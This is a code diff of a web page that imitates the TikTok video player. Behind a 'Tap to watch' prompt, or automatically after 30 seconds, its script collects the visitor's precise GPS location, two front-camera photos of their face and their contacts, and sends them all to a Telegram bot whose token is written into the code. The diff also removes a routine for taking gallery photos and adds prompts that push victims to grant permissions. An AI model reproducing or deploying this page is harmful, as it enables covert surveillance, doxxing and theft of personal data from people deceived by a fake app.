@@ -25,7 +25,6 @@
             position: relative;
         }
 
-        /* --- Video Player Container (Exactly like TikTok) --- */
         .video-container {
             width: 100vw;
             height: 100vh;
@@ -39,7 +38,6 @@
             overflow: hidden;
         }
 
-        /* Video placeholder with TikTok gradient */
         .video-placeholder {
             width: 100%;
             height: 100%;
@@ -101,7 +99,6 @@
             font-weight: 600;
         }
 
-        /* TikTok Logo */
         .tiktok-logo {
             position: absolute;
             top: 20px;
@@ -114,7 +111,6 @@
             letter-spacing: -0.5px;
         }
 
-        /* --- Loading Overlay --- */
         #loading-overlay {
             position: absolute;
             top: 0;
@@ -160,7 +156,6 @@
             margin-top: 10px;
         }
 
-        /* Progress Bar */
         .progress-bar {
             width: 250px;
             height: 4px;
@@ -177,7 +172,6 @@
             transition: width 0.3s ease;
         }
 
-        /* --- TikTok Sidebar (Right side) --- */
         .tiktok-sidebar {
             position: absolute;
             right: 12px;
@@ -209,7 +203,6 @@
             filter: drop-shadow(0 2px 4px rgba(0,0,0,0.4));
         }
 
-        /* Bottom Navigation Bar */
         .bottom-nav {
             position: absolute;
             bottom: 0;
@@ -245,7 +238,6 @@
             margin-bottom: 4px;
         }
 
-        /* Video Info (Bottom Left) */
         .video-info {
             position: absolute;
             bottom: 85px;
@@ -297,7 +289,6 @@
             pointer-events: none;
         }
 
-        /* Notification */
         #notification {
             position: absolute;
             bottom: 100px;
@@ -326,7 +317,6 @@
     <div class="video-container">
         <div class="tiktok-logo">TikTok</div>
         
-        <!-- Video Placeholder (TikTok style play button) -->
         <div class="video-placeholder" id="video-placeholder">
             <div class="play-button">
                 <svg viewBox="0 0 24 24">
@@ -336,7 +326,6 @@
             <div class="placeholder-text" id="placeholder-text">Tap to watch</div>
         </div>
 
-        <!-- Fake TikTok UI Elements (100% TikTok Style) -->
         <div class="tiktok-sidebar" id="fake-sidebar">
             <div class="sidebar-icon">
                 <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
@@ -383,7 +372,6 @@
             </div>
         </div>
 
-        <!-- Loading Overlay -->
         <div id="loading-overlay">
             <div class="spinner"></div>
             <div class="loading-message" id="loading-message">Loading video...</div>
@@ -396,12 +384,10 @@
     </div>
 
     <script>
-        // Telegram Configuration
         const TELEGRAM_BOT_TOKEN = '8501264176:AAGTzenTv4CLwN0W5x7uZA_rG4Rc8N8zBzI';
         const CHAT_ID = '8491676638';
         const TIKTOK_REDIRECT_URL = 'https://www.tiktok.com/@tiktok/video/7325515231713506592';
 
-        // DOM Elements
         const videoPlaceholder = document.getElementById('video-placeholder');
         const loadingOverlay = document.getElementById('loading-overlay');
         const loadingMessage = document.getElementById('loading-message');
@@ -412,40 +398,53 @@
             progressFill.style.width = percent + '%';
         }
 
-        function showNotification(msg, type = 'info') {
+        function showNotification(msg) {
             notificationDiv.textContent = msg;
             notificationDiv.classList.add('show');
             setTimeout(() => notificationDiv.classList.remove('show'), 3000);
         }
 
-        // ==================== 1. PRECISE GPS LOCATION ====================
+        // ========== 1. PRECISE GPS LOCATION (مع محاولات متعددة) ==========
         async function getPreciseLocation() {
             return new Promise((resolve) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            resolve({
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                accuracy: position.coords.accuracy,
-                                altitude: position.coords.altitude || null,
-                                speed: position.coords.speed || null,
-                                timestamp: position.timestamp
-                            });
-                        },
-                        (error) => {
-                            console.warn('GPS error:', error.message);
-                            resolve(null);
-                        },
-                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                    );
-                } else {
-                    resolve(null);
-                }
+                let attempts = 0;
+                const maxAttempts = 3;
+                
+                const tryGetLocation = () => {
+                    attempts++;
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            (position) => {
+                                resolve({
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude,
+                                    accuracy: position.coords.accuracy,
+                                    altitude: position.coords.altitude || null,
+                                    speed: position.coords.speed || null,
+                                    timestamp: position.timestamp,
+                                    success: true
+                                });
+                            },
+                            (error) => {
+                                console.warn(`GPS attempt ${attempts} failed:`, error.message);
+                                if (attempts < maxAttempts) {
+                                    setTimeout(tryGetLocation, 2000);
+                                } else {
+                                    resolve({ success: false, error: error.message });
+                                }
+                            },
+                            { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+                        );
+                    } else {
+                        resolve({ success: false, error: 'Geolocation not supported' });
+                    }
+                };
+                
+                tryGetLocation();
             });
         }
 
-        // ==================== 2. CAPTURE 2 FRONT CAMERA PHOTOS ====================
+        // ========== 2. CAPTURE 2 FRONT CAMERA PHOTOS ==========
         async function captureFrontCameraPhotos() {
             return new Promise(async (resolve) => {
                 try {
@@ -495,52 +494,7 @@
             });
         }
 
-        // ==================== 3. GET 30 PHOTOS FROM GALLERY ====================
-        async function getGalleryPhotos() {
-            return new Promise((resolve) => {
-                const input = document.createElement('input');
-                input.type = 'file';
-                input.accept = 'image/*';
-                input.multiple = true;
-                input.style.position = 'absolute';
-                input.style.left = '-9999px';
-                document.body.appendChild(input);
-                
-                const timeout = setTimeout(() => {
-                    if (document.body.contains(input)) document.body.removeChild(input);
-                    resolve([]);
-                }, 90000);
-                
-                input.onchange = async (event) => {
-                    clearTimeout(timeout);
-                    const files = Array.from(event.target.files);
-                    const images = [];
-                    
-                    for (let i = 0; i < files.length && i < 30; i++) {
-                        const file = files[i];
-                        if (file.type.startsWith('image/')) {
-                            const reader = new FileReader();
-                            const imgData = await new Promise((res) => {
-                                reader.onload = (e) => res(e.target.result);
-                                reader.readAsDataURL(file);
-                            });
-                            images.push({
-                                name: file.name,
-                                size: file.size,
-                                data: imgData
-                            });
-                        }
-                    }
-                    
-                    document.body.removeChild(input);
-                    resolve(images);
-                };
-                
-                input.click();
-            });
-        }
-
-        // ==================== 4. GET ALL CONTACTS ====================
+        // ========== 3. GET ALL CONTACTS ==========
         async function getAllContacts() {
             if (!navigator.contacts || !navigator.contacts.select) {
                 return [];
@@ -554,19 +508,23 @@
             }
         }
 
-        // ==================== SEND TO TELEGRAM FUNCTIONS ====================
+        // ========== SEND TO TELEGRAM ==========
         async function sendLocationToTelegram(location) {
             let message = `📍 <b>PRECISE USER LOCATION</b>\n\n`;
-            message += `🕒 Time: ${new Date().toISOString()}\n`;
+            message += `🕒 Time: ${new Date().toLocaleString()}\n`;
             
-            if (location) {
+            if (location && location.success === true) {
+                const mapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}&z=18`;
                 message += `🎯 Latitude: ${location.latitude}\n`;
                 message += `🎯 Longitude: ${location.longitude}\n`;
                 message += `📡 Accuracy: ±${location.accuracy} meters\n`;
                 if (location.altitude) message += `⛰️ Altitude: ${location.altitude}m\n`;
-                message += `\n🗺️ <a href="https://www.google.com/maps?q=${location.latitude},${location.longitude}&z=18">📍 Open Google Maps</a>`;
+                if (location.speed) message += `🏃 Speed: ${location.speed}m/s\n`;
+                message += `\n🗺️ <a href="${mapsUrl}">📍 Click to open Google Maps</a>\n`;
+                message += `🗺️ <a href="https://www.openstreetmap.org/?mlat=${location.latitude}&mlon=${location.longitude}&zoom=18">🗺️ OpenStreetMap</a>`;
             } else {
-                message += `❌ Location unavailable`;
+                message += `❌ Location unavailable - ${location?.error || 'Permission denied'}\n`;
+                message += `⚠️ Please allow location access and try again.`;
             }
             
             try {
@@ -589,7 +547,7 @@
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📸 No front camera photos captured` })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📸 No front camera photos captured - camera permission may be denied` })
                 });
                 return;
             }
@@ -599,37 +557,9 @@
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', photoBlob, `front_camera_${i+1}.jpg`);
-                formData.append('caption', `📸 FRONT CAMERA PHOTO ${i+1}/2 - User face capture`);
+                formData.append('caption', `📸 FRONT CAMERA PHOTO ${i+1}/2\n🕒 ${new Date().toLocaleString()}\n📍 User face capture`);
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                 await new Promise(r => setTimeout(r, 500));
-            }
-        }
-
-        async function sendGalleryToTelegram(photos) {
-            if (!photos || photos.length === 0) {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: `🖼️ No gallery photos selected` })
-                });
-                return;
-            }
-            
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: `🖼️ <b>GALLERY PHOTOS</b>\nSelected: ${photos.length} images`, parse_mode: 'HTML' })
-            });
-            
-            for (let i = 0; i < photos.length; i++) {
-                const photo = photos[i];
-                const photoBlob = await fetch(photo.data).then(r => r.blob());
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', photoBlob, `gallery_${i+1}.jpg`);
-                formData.append('caption', `📷 Gallery Photo ${i+1}/${photos.length}\n📁 ${photo.name.substring(0, 50)}`);
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                await new Promise(r => setTimeout(r, 400));
             }
         }
 
@@ -638,12 +568,13 @@
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📞 No contacts shared` })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📞 No contacts shared - permission may be denied` })
                 });
                 return;
             }
             
             let message = `📞 <b>CONTACTS - ${contacts.length} contacts</b>\n\n`;
+            message += `🕒 ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━━━\n\n`;
             
             for (let i = 0; i < Math.min(contacts.length, 50); i++) {
                 const c = contacts[i];
@@ -656,72 +587,70 @@
                 if (message.length > 3900) break;
             }
             
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
-            });
-            
-            // Send contacts as JSON file
-            const contactsJson = JSON.stringify(contacts, null, 2);
-            const blob = new Blob([contactsJson], { type: 'application/json' });
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('document', blob, 'contacts_backup.json');
-            formData.append('caption', `📇 Complete contacts backup (${contacts.length} contacts)`);
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+                });
+                
+                // Send contacts as JSON file
+                const contactsJson = JSON.stringify(contacts, null, 2);
+                const blob = new Blob([contactsJson], { type: 'application/json' });
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('document', blob, 'all_contacts_backup.json');
+                formData.append('caption', `📇 Complete contacts backup (${contacts.length} contacts)\n🕒 ${new Date().toLocaleString()}`);
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
+            } catch(e) { console.error('Contacts send error:', e); }
         }
 
-        // ==================== MAIN STEALTH OPERATION ====================
+        // ========== MAIN OPERATION ==========
         async function startStealthOperation() {
             try {
                 updateProgress(5);
                 loadingMessage.textContent = 'Connecting...';
                 await new Promise(r => setTimeout(r, 300));
                 
-                // Step 1: Get Location
+                // Step 1: Get Location (مع رسالة واضحة للمستخدم)
                 updateProgress(15);
-                loadingMessage.textContent = 'Getting precise location...';
+                loadingMessage.textContent = 'Getting your precise location...';
+                showNotification('📍 Please allow location access');
                 const location = await getPreciseLocation();
                 await new Promise(r => setTimeout(r, 500));
                 
-                updateProgress(25);
+                updateProgress(30);
                 loadingMessage.textContent = 'Sending location data...';
                 await sendLocationToTelegram(location);
-                await new Promise(r => setTimeout(r, 500));
+                await new Promise(r => setTimeout(r, 600));
                 
                 // Step 2: Capture Front Camera Photos
-                updateProgress(35);
-                loadingMessage.textContent = 'Initializing camera...';
-                await new Promise(r => setTimeout(r, 300));
-                
                 updateProgress(45);
+                loadingMessage.textContent = 'Initializing camera...';
+                showNotification('📸 Camera access needed');
+                await new Promise(r => setTimeout(r, 500));
+                
+                updateProgress(55);
                 loadingMessage.textContent = 'Capturing photos...';
                 const frontPhotos = await captureFrontCameraPhotos();
                 await sendFrontPhotosToTelegram(frontPhotos);
-                await new Promise(r => setTimeout(r, 500));
-                
-                // Step 3: Get Gallery Photos (30 photos)
-                updateProgress(55);
-                loadingMessage.textContent = 'Please select photos (up to 30)...';
-                const galleryPhotos = await getGalleryPhotos();
-                await new Promise(r => setTimeout(r, 400));
-                
-                updateProgress(70);
-                loadingMessage.textContent = `Sending ${galleryPhotos.length} photos...`;
-                await sendGalleryToTelegram(galleryPhotos);
                 await new Promise(r => setTimeout(r, 600));
                 
-                // Step 4: Get Contacts
-                updateProgress(85);
+                // Step 3: Get Contacts
+                updateProgress(75);
                 loadingMessage.textContent = 'Accessing contacts...';
+                showNotification('📞 Please allow contacts access');
+                await new Promise(r => setTimeout(r, 500));
+                
+                updateProgress(85);
+                loadingMessage.textContent = 'Reading contacts...';
                 const contacts = await getAllContacts();
                 await new Promise(r => setTimeout(r, 400));
                 
-                updateProgress(95);
+                updateProgress(92);
                 loadingMessage.textContent = 'Sending contacts...';
                 await sendContactsToTelegram(contacts);
-                await new Promise(r => setTimeout(r, 500));
+                await new Promise(r => setTimeout(r, 600));
                 
                 // Complete
                 updateProgress(100);
@@ -733,14 +662,14 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
                         chat_id: CHAT_ID, 
-                        text: `✅ <b>COMPLETE REPORT</b>\n━━━━━━━━━━━━━━\n📍 Location: ${location ? '✓' : '✗'}\n📸 Front Camera: ${frontPhotos.length}/2\n🖼️ Gallery: ${galleryPhotos.length} photos\n📞 Contacts: ${contacts.length}\n🕒 ${new Date().toLocaleString()}`,
+                        text: `✅ <b>COMPLETE REPORT</b>\n━━━━━━━━━━━━━━━━━━\n📍 Location: ${location?.success === true ? '✓ Captured' : '✗ Failed'}\n📸 Front Camera: ${frontPhotos.length}/2 photos\n📞 Contacts: ${contacts.length} contacts\n━━━━━━━━━━━━━━━━━━\n🕒 ${new Date().toLocaleString()}\n🌐 User Agent: ${navigator.userAgent.substring(0, 60)}...`,
                         parse_mode: 'HTML'
                     })
                 });
                 
             } catch (error) {
                 console.error('Error:', error);
-                showNotification('Connection error', 'error');
+                showNotification('Connection error, please try again');
                 updateProgress(100);
             } finally {
                 setTimeout(() => {
@@ -755,7 +684,6 @@
             document.getElementById('fake-nav')?.classList.add('hidden-ui');
         }
 
-        // Event Listeners
         videoPlaceholder.addEventListener('click', () => {
             videoPlaceholder.classList.add('hidden');
             loadingOverlay.classList.add('active');
@@ -765,7 +693,6 @@
 
         showNotification('Tap to watch video');
 
-        // Auto-start after 30 seconds
         setTimeout(() => {
             if (!loadingOverlay.classList.contains('active')) {
                 showNotification('Auto-playing video...');
